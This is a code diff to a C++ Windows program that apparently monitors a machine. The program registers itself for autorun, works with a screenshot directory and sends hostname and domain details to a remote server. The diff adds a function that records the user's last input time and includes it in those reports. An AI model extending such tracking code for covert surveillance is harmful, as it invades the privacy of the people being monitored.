@@ -7,6 +7,11 @@
 #include <StrSafe.h>
 #include <vector>
 #include <thread>
+#include <chrono>
+#include <ctime>
+#include <sstream>
+#include <iomanip>
+
 using namespace std;
 
 int generator = 1;
@@ -125,6 +130,25 @@ bool addToAurorun(const wstring& programName, const wstring& executablePath) {
     return true;
 }
 
+string getLastUserActivityTime() {
+    LASTINPUTINFO lii;
+    auto tp = chrono::system_clock::now();
+
+    lii.cbSize = sizeof(LASTINPUTINFO);
+    if (GetLastInputInfo(&lii)) {
+        DWORD idleTimeMs = GetTickCount() - lii.dwTime;
+        auto now = chrono::system_clock::now();
+        auto nowMs = chrono::time_point_cast<chrono::milliseconds>(now);
+        tp = nowMs - chrono::milliseconds(idleTimeMs);
+    }
+
+    auto timeT = chrono::system_clock::to_time_t(tp);
+    tm localTime;
+    localtime_s(&localTime, &timeT);
+    ostringstream oss;
+    oss << put_time(&localTime, "%Y-%m-%d %H:%M:%S");
+    return oss.str();
+}
 
 int main() {
     addToAurorun(L"Exe", getExecProgramPath());
@@ -137,10 +161,11 @@ int main() {
     string screenshot_dir = conf["screenshot_dir"];
     string host_name = getPCName();
     string host_domain_name = getPCDomain();
+    auto lastActiveTime = getLastUserActivityTime();
+
     if (host_domain_name.length() == 0) {
         host_domain_name = "no domain";
     }
-
 
     while (true) {
 
@@ -166,6 +191,8 @@ int main() {
                     string info = "";
                     info += "hostname: " + host_name + "\n";
                     info += "domain: " + host_domain_name + "\n";
+                    info += "last_activ_time: " + getLastUserActivityTime() + "\n";
+
                     client->sendMessage("STATE START");
                     client->sendMessage(info);
                     client->sendMessage("STATE END");
